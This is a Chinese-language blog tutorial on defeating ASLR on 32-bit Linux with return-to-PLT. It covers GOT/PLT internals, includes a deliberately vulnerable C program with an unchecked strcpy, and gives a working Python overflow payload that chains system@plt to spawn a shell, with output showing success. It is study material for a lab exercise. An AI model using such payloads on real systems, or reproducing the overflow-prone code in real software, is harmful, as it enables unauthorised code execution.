---
author: sn0rt
comments: true
date: 2016-06-02
layout: post
tag: binary
title: ret2plt bypass aslr on linux32
---

# 0x00 beginning

这个笔记是记录学习`bypass ASLR`过程的第一篇, 实验的主要来自`sploitfun`[^origin].

>what's ASLR?

ASLR(Address space layout randomization) 是利用随机化分布内存位置来提高`exp`执行门槛的技术, 随机化分布的对象有

* stack address
* heap address
* Shared library address
* kernel address

当地址被随机化过后`exp`需要定位到具体内存地址可能已经发生了变化. 比如之前笔记里面的`bypass nx`使用的`ret2libc`技术会因为`libc`基地址变化导致`system()`地址变化了而失效, 但是这个随机化并不是真正的随机无规律, 否则我很难想象计算机是怎么运行的 (那么也不会有这篇笔记).

在绝大多数的 Linux 发行版当中地址随机化是开启的, 在内核文档里面关于其选项的参数如下

```ini
randomize_va_space:

This option can be used to select the type of process address
space randomization that is used in the system, for architectures
that support this feature.

0 - Turn the process address space randomization off.  This is the
    default for architectures that do not support this feature anyways,
    and kernels that are booted with the "norandmaps" parameter.

1 - Make the addresses of mmap base, stack and VDSO page randomized.
    This, among other things, implies that shared libraries will be
    loaded to random addresses.  Also for PIE-linked binaries, the
    location of code start is randomized.  This is the default if the
    CONFIG_COMPAT_BRK option is enabled.

2 - Additionally enable heap randomization.  This is the default if
    CONFIG_COMPAT_BRK is disabled.
```

用来学习研究漏洞代码源码如下:

```c

// gcc -g -o vuln vuln.c -fno-stack-protector
// Q: 为什么使用这个代码?
// A: 因为有 system() 和"/bin/sh",ret2libc 要素.

#include <stdio.h>
#include <string.h>

/* Eventhough shell() function isnt invoked directly, its needed here since
 * 'system@PLT' and 'exit@PLT' stub code should be present in executable to 
 * successfully exploit it. 
 */
void shell() {
 system("/bin/sh");
 exit(0);
}

int main(int argc, char* argv[]) {
 int i=0;
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 return 0;
}

```

# 0x01 analysis

当`libc`的基地址被随机化, 让我们找不到`system()`, 但是`system()`在`libc`中的相对偏移量是个常数 (在同一个编译的 libc 中), 这就是突破`Shared library address randomization`的其中一个关键点, 目前主流有三种方法:

* Return-to-plt
* Brute force
* GOT overwrite and GOT dereference

当前笔记主要讨论`return-to-plt`.

>What is return-to-plt?

在 ASLR 开到 2 时`libc`中的基址已经躲猫猫了, 而 PLT 的函数却没有 (在执行前就能知道), 因此可以把原打算`ret2libc`目标函数位置变成 return 到`plt`里面的位置.

>如何理解`ret2libc`目标函数位置变成 return 到`plt`里面的位置?

PLT 是 ELF 中的一个`section`, 当程序多次使用共享库里函数时候, 编译器帮我们生成特殊的`section`来引用全部的函数, 这个`section`包含许多转跳指令, 可以用如下指令查看.
    
    objdump -d -j .plt /paht/elf/filename

在设计上, 共享库不同于静态库, 共享库的`text section`由多进程共享而`data section`是每进程独立, 有助节约内存与磁盘, 因这样的设计`text section`该给`rx`权限才显合理, 但这又导致了链接器不能重定位数据符号或函数地址到`text section`, 那么链接器该如何在不修改代码的情况下在运行时候重定位共享库呢? 答案是使用`PIC`.

>What is PIC?

PIC(Position Independent Code) 是针上述问题而开发, 它使共享库的`text section`被多进程共享时而不管加载时的预先重定位.PIC 用间接层达成此目 -- 被共享的`text section`不包含放置全局符号和函数引用在虚拟内存的绝对地址取而代之是放在`data section`的特殊表里面, 表中放置了全局符号和函数引用的绝对虚拟地址, 链接器在重定位的时会填满表, 这样仅修改了`data section`而`text section`避免修改.

在 PIC 中链接器重定位全局符号与函数的发现有两种不同的描述:

>* GOT: Global offset table contains a 4 byte entry for each global variable, where the 4 byte entry contains the address of the global variable. When an instruction in code segment refers to a global variable, instead of global variable’s absolute virtual address the instruction points to an entry in GOT. This GOT entry is relocated by the dynamic linker when the shared library is loaded. Thus PIC uses this table to relocate global symbols with **a single level of indirection**.

>* PLT: Procedural Linkage Table contains a stub code for each global function. A call instruction in text segment doesnt call the function directly instead it calls the stub code (function@PLT). This stub code with the help of dynamic linker resolves the function address and its copied to GOT (GOT[n]). This resolution happens only during the first invocation of the function, later on when a call instruction in code segment calls the stub code (function@PLT) instead of invoking dynamic linker to resolve the function address, stub code directly obtains the function address from GOT (GOT[n]) and jumps to it.Thus PIC uses this table to relocate function addresses with **two level of indirection**.

稍微总结一下: 在程序运行过程中,plt 是不可写的.got 是可写的.plt 在编译时候就确定下来的,got 是在运行时候变化的. 共享库机制通过 plt 去找 got(第一次运行后修改) 才到真的函数.

调试例子:

```shell
gdb-peda$ disassemble main
Dump of assembler code for function main:
    ...
   0x08048439 <+28>:	call   0x80482f0 <printf@plt>
   0x0804843e <+33>:	mov    eax,0x0
   0x08048443 <+38>:	leave  
   0x08048444 <+39>:	ret    
End of assembler dump.
gdb-peda$ disassemble 0x80482f0
Dump of assembler code for function printf@plt:
   0x080482f0 <+0>:	jmp    DWORD PTR ds:0x804a00c
   0x080482f6 <+6>:	push   0x0
   0x080482fb <+11>:	jmp    0x80482e0
End of assembler dump.
```

在`printf`调用之前,`printf@plt`的 0x080482f6 其指向地址转跳地址为 0x804a00c.

```shell
gdb-peda$ x/lwx 0x804a00c
0x804a00c <printf@got.plt>:	0x080482f6
gdb-peda$ b *0x0804843e
Breakpoint 1 at 0x804843e
gdb-peda$ r
Starting program: /home/Sn0rt/lab/a.out 
Hello (null)
[-------------------------------------code-------------------------------------]
   ...
   0x8048439 <main+28>:	call   0x80482f0 <printf@plt>
=> 0x804843e <main+33>:	mov    eax,0x0
   0x8048443 <main+38>:	leave  
   0x8048444 <main+39>:	ret    
   ...
Breakpoint 1, 0x0804843e in main ()
gdb-peda$ x/lwx 0x804a00c
0x804a00c <printf@got.plt>:	0xb7e70280

```

在第一次`printf`调用完成过后,`printf@got.plt`地址变成由 0x080482f6 变成 0xb7e70280.

# 0x03 how to use?

肉眼能识别例子程序里面有栈溢出, 但是如何利用呢?
根据分析引入的知识, 利用起来不需要精确的`libc`中函数的地址, 我们可以简单的使用`function@plt`的地址 (运行前已经知道).

先反汇编看一下`shell`函数里面`system@plt`与`exit@plt`

```shell
gdb-peda$ disassemble shell
Dump of assembler code for function shell:
   0x080484ad <+0>:	push   ebp
   0x080484ae <+1>:	mov    ebp,esp
   0x080484b0 <+3>:	sub    esp,0x18
   0x080484b3 <+6>:	mov    DWORD PTR [esp],0x80485a0
   0x080484ba <+13>:	call   0x8048370 <system@plt>
   0x080484bf <+18>:	mov    DWORD PTR [esp],0x0
   0x080484c6 <+25>:	call   0x8048390 <exit@plt>
End of assembler dump.
```

可以看见`plt`里面的两个地址, 在这里完成可以把其当成`libc`里面的函数去利用, 准备布置`exp`.

```python
#!/usr/bin/env python
from pwn import p32
from subprocess import call

exit = 0x8048390
system = 0x8048370
binshaddr = 0x80485a0
payload = 'A' * 272 + p32(system) + p32(exit) + p32(binshaddr)
call(["./aslr_1", payload])
```

如何去确定那 272 的 offset? 这个是 peda 的套路啊!
方法完全是 re2libc 的翻版, 关于那`binshaddr`是在`shell`函数里面放好的, 他的地址是不会变的, 因为它是常量放在.rodata.

```shell
Sn0rt@warzone:~/lab$ python aslr_1_exp.py 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp�����
$ uid=1042(Sn0rt) gid=1043(Sn0rt) groups=1043(Sn0rt)
$ 
```
初步利用完成, 成功 bypass ASLR and NX!

# 0x04 doubt

* 如果`ret2libc`的目标函数不存在`plt`中这个方法应该失效? 还有如果有更好的共享库方案是 plt 存在优势不具备了, 那么这个`section`可能会变成历史, 方法也有可能被 GG.

### reference

[^origin]: [sploitfun](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/)
